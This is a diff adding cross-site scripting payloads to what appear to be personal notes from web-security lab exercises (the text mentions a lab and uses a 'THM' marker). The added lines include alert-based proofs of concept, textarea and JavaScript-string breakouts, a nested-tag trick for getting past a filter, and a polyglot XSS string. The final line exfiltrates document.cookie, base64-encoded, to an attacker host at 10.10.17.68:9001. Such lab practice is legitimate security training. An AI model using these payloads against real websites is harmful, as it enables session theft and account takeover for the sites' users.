@@ -95,4 +95,25 @@ Para resolver este laboratorio, realice un ataque de secuencias de comandos entr
 <script> document.write(sanitizeHtml('<iframe onload=alert(1)>'))</script>
 
 
-"><script>alert(1)</script>
+"><script>alert('THM')</script>
+
+<script>alert('THM');</script>
+</textarea><script>alert('THM');</script>
+
+
+';alert('THM');//
+
+
+Original Payload:
+<sscriptcript>alert('THM');</sscriptcript>
+
+Text to be removed (by the filter):
+<sscriptcript>alert('THM');</sscriptcript>
+
+Final Payload (after passing the filter):
+<script>alert('THM');</script>
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+
+
+</textarea><script>fetch('http://10.10.17.68:9001?cookie=' + btoa(document.cookie) );</script>
